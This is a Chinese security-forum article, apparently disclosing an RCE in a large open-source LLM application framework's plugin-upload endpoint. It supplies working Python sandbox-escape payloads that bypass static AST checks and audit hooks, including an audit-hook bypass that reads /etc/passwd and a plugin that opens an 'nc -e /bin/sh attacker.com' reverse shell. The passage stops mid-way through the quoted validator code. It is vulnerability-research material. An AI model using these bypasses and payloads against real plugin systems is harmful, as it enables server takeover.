---
title: 从某BAT大厂开源框架实战审计揭秘 LLM 集成框架中的隐蔽加载漏洞
url: https://forum.butian.net/share/4710
source: 奇安信攻防社区
date: 2026-01-08
fetch_date: 2026-01-09T03:30:15.122262
---

# 从某BAT大厂开源框架实战审计揭秘 LLM 集成框架中的隐蔽加载漏洞

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 从某BAT大厂开源框架实战审计揭秘 LLM 集成框架中的隐蔽加载漏洞

* [漏洞分析](https://forum.butian.net/topic/48)

最近在研究LLM集成应用框架时，在审计某BAT大厂的github18k大型开源LLM集成应用框架项目时发现了一处隐蔽的加载漏洞，虽然开发者打过了防御补丁，但仍然可进行绕过并已提交CVE。遂深入进行了该类型的漏洞在LLM集成应用框架中的探究，供师傅们交流指点...

从某实战审计揭秘 LLM 集成框架中的隐蔽加载漏洞
=========================
最近在研究LLM集成应用框架时，在审计某BAT大厂的github18k大型开源LLM集成应用框架项目时发现了一处隐蔽的加载漏洞，虽然开发者打过了防御补丁，但仍然可进行绕过并已提交CVE。遂深入进行了该类型的漏洞在LLM集成应用框架中的探究，供师傅们交流指点...
1.归纳攻击路径
--------
随着 AI 从“聊天机器人”向“自主智能体（Agentic AI）”演进，许多\*\*LLM 集成应用框架\*\*成为了连接大模型与物理世界的桥梁。这些框架通过插件（Plugins）和工具（Tools）赋予了模型执行代码、访问数据库的能力。
然而，这种能力的赋予也导致了一个极度隐蔽的代码注入：在这些框架通用的插件加载机制中，存在一个系统性的RCE漏洞——即便开发者部署了看似严密的静态分析安全审查，攻击者依然能利用“加载时执行”的特性，将恶意载荷伪装成功能扩展，实现对服务器的完全接管。
我在审计了多个LLM应用框架后首先归纳总结一下该类加载漏洞的经典污染点流路径
在 LLM 集成应用中，插件系统通常被设计为“动态可扩展”，这一类漏洞通常遵循一个通用的“受污染路径”：
1. \*\*Source\*\*：框架暴露文件上传接口（如插件/工具安装包）。这些接口往往缺乏严格的身份验证，或被认为是“低风险”的操作入口。
2. \*\*Static Analysis WAF\*\*：系统在保存代码前，会调用安全模块对 Python 文件进行静态扫描（如 AST 校验、沙箱执行）。它试图识别并拦截 `subprocess` 或 `os.system` 等敏感调用。
3. \*\*Pyjail\*\*: 由于 Python是动态语言，攻击者可以利用动态导入、继承链等特性绕过AST静态扫描、hook和沙箱逃逸等
4. \*\*Sink\*\*：为了让插件生效，框架必须执行“扫描与刷新（Refresh/Scan）”。在这个过程中，系统会尝试 导入加载 这些模块导致poc执行。
2 逃脱静态分析的艺术
-----------
这一部分和师傅们经常遇到的CTF的Pyjail挑战中相似：在 AI 应用框架中，针对插件源码的“语义审查”通常包括：禁用敏感库（如 os, subprocess）、拦截敏感函数调用（如 eval, exec）以及限制魔术属性访问（如 \*\*subclasses\*\*）。
最基础的审查通常使用 ast.Name 或 ast.Attribute 来匹配关键词。攻击者可以通过字符串混淆和 getattr 动态重建调用链。
利用字符串拼接或反转绕过特征匹配。
```Python
# 绕过拦截器对 "os" 和 "system" 的直接检索
m = \_\_import\_\_('o' + 's')
f = getattr(m, 'metsys'[::-1])
f('whoami')
```
### 2.1 利用Python继承链
如果框架完全禁用了导入机制，攻击者会转向 Python 的内建对象体系。通过查找 object 的子类，可以在不直接引入任何库的情况下，从内存中“捞出”具备系统执行能力的模块。
- 从元组或列表的类对象出发，通过 \*\*mro\*\* 回溯到基类，再通过 \*\*subclasses\*\* 遍历所有加载到内存的类。
```Python
# 静态分析器只能看到属性访问，无法预测结果会指向危险函数
# 寻找 site.\_Printer 或 os.\_wrap\_close 等带有执行能力的类
for c in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_():
if c.\_\_name\_\_ == 'os.\_wrap\_close':
# 从该类的全局变量中直接提取并执行命令
c.\_\_init\_\_.\_\_globals\_\_['system']('id')
[ x.\_\_init\_\_.\_\_globals\_\_ for x in ''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if "'\_sitebuiltins." in str(x) and not "\_Helper" in str(x) ][0]["sys"].modules["os"]
#\_wrap\_close
[ x.\_\_init\_\_.\_\_globals\_\_ for x in ''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if x.\_\_name\_\_=="\_wrap\_close"][0]["system"]("ls")
```
### 2.2 Encode
静态审计工具在处理字符串常量时，通常只能看到字面值。攻击者可以利用 base64、hex 或 unicode 变体，将 Payload 转化为为一串看似无意义的杂乱字符进行绕过。
- 将恶意逻辑序列化。由于许多 AI 框架本身支持序列化处理（用于传输模型参数或配置），这为 Payload 提供了天然的保护色。
```python
exec("print('RCE'); \_\_import\_\_('os').system('ls')")
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
```
### 2.4 Audit hook
比如这段audit hook waf:
```python
import sys
def my\_audit\_hook(my\_event, \_):
    WHITED\_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my\_event not in WHITED\_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my\_event))
sys.addaudithook(my\_audit\_hook)
```
要绕过Audit hook我们需要先了解Python 中的审计事件包括但不限于以下几类：
- `import`：发生在导入模块时。
- `open`：发生在打开文件时。
- `exec`：发生在执行Python代码时。
- `compile`：发生在编译Python代码时。
- `socket`：发生在创建或使用网络套接字时。
- `os.system`，`os.popen`等：发生在执行操作系统命令时。
- `subprocess.Popen`，`subprocess.run`等：发生在启动子进程时
而posixsubprocess 模块是 Python 的内部模块,模块核心功能是 fork\\_exec 函数，fork\\_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,\*\*每个版本的 Python 可能有所差异\*\*
下面是一个最小化示例:
```python
import os
import \_posixsubprocess
\_posixsubprocess.fork\_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, \*(os.pipe()), False, False,False, None, None, None, -1, None, False)
```
结合上面的 `\_\_loader\_\_.load\_module(fullname)` 可以得到最终的 payload:
`builtins.input/result`, compile, exec 三个 hook都没有触发
```python
\_\_loader\_\_.load\_module('\_posixsubprocess').fork\_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, \*(\_\_loader\_\_.load\_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```
### 2.5 Init注入
为了应对加载时的扫描，攻击者可以将恶意代码注入到框架必经的钩子函数中。
- 不直接在顶层执行代码，而是利用 \*\*\*\*init\*\*\*\* 或自定义的 setup()。当框架扫描完代码并认为其“结构安全”后，在后续的实例化或逻辑调用中再触发 Payload。
```python
class ExploitPlugin(BasePlugin):
def \_\_init\_\_(self):
#这是一个正常的初始化过程
self.logger.info("Initializing Intelligence Plugin...")
\_\_import\_\_('threading').Thread(target=lambda: \_\_import\_\_('os').system('nc -e /bin/sh attacker.com 4444')).start()
```
3 某大厂开源LLM应用的实战审计
-----------------
废话不多说直接开始漏洞审计过程分析（在此不提供该项目名字了，师傅们可自行查找），在我们在某端点上传功能中发现了一个严重的\*\*远程代码执行（RCE）漏洞\*\*。该漏洞位于 `/api/v1/personal/agent/upload` 接口，攻击者可以通过精心构造的恶意插件包，绕过系统内置的 AST（抽象语法树）静态安全检查，在服务器加载插件的瞬间夺取系统最高权限。
该漏洞的核心在于 “加载即执行” 。虽然试图通过静态分析（AST 检查）来过滤危险的 Python 导入（如 `subprocess`），但它忽视了 Python 动态语言的特性。攻击者可以利用动态导入（Dynamic Import）等逃逸技术规避检查。当系统调用 `refresh\_plugins()` 刷新插件库时，恶意代码会在模块导入阶段被静默触发。
### 3.1 Source-Sink Analysis
漏洞存在于从用户上传文件到后端自动扫描加载的完整调用链中：
1. Source api端点
在 `controller.py` 中，`/v1/personal/agent/upload` 接口允许用户上传 ZIP 格式的插件包：
```python
@router.post("/v1/personal/agent/upload", response\_model=Result[str])
async def personal\_agent\_upload(doc\_file: UploadFile = File(...), user: str = None):
logger.info(f"personal\_agent\_upload:{doc\_file.filename},{user}")
try:
await plugin\_hub.upload\_my\_plugin(doc\_file, user)
module\_plugin.refresh\_plugins()
return Result.succ(None)
except Exception as e:
logger.error("Upload Personal Plugin Error!", e)
return Result.failed(code="E0023", msg=f"Upload Personal Plugin Error {e}")
```
2. WAF-AST 静态审计
系统在 `plugin\_hub.py` 的 `\_validate\_plugin\_code` 中对解压后的代码进行审计, 到这里就可以发现非常像一些pyjail的挑战。
```python
def \_validate\_plugin\_code(self, file\_path: str) -> bool:
"""Validate plugin code for potentially malicious operations.
Args:
file\_path: Path to the Python file to validate
Returns:
bool: True if the code is safe, raises an exception otherwise
"""
with open(file\_path, "r", encoding="utf-8") as f:
code = f.read()
# Parse the code into an AST
try:
tree = ast.parse(code)
except SyntaxError:
raise ValueError("Plugin contains invalid Python syntax")
# Check for potentially dangerous imports
for node in ast.walk(tree):
# Check for import statements
if isinstance(node, ast.Import):
for name in node.names:
if name.name in self.disallowed\_imports:
raise ValueError(
f"Plugin contains disallowed import: {name.name}"
)
# Check for from ... import statements
elif isinstance(node, ast.ImportFrom):
module = node.module or ""
if module in self.disallowed\_imports:
raise ValueError(f"Plugin contains disallowed import: {module}")
for name in node.names:
combined = f"{module}.{name.name}" if module else name.name
if (
combined in self.disallowed\_imports
or name.name in self.disallowed\_imports
):
raise ValueError(
f"Plugin contains disallowed import: {combined}"
)
# Check for calls to dangerous functions
elif isinstance(node, ast.Call):
if isinstance(node.func, ast.Name):
if node.func.id in {"eval", "exec", "compile"}:
raise ValueError(
f"Plugin contains potentially dangerous function call: "
f"{node.func.id}"
)
elif isinstance(node.func, ast.Attribute):
if isinstance(node.func.value, ast.Name):
if node.func.value.id == "os" and node.func.attr in {
"system",
"popen",
"spawn",
"exec",
}:
raise ValueError(
f"Plugin contains...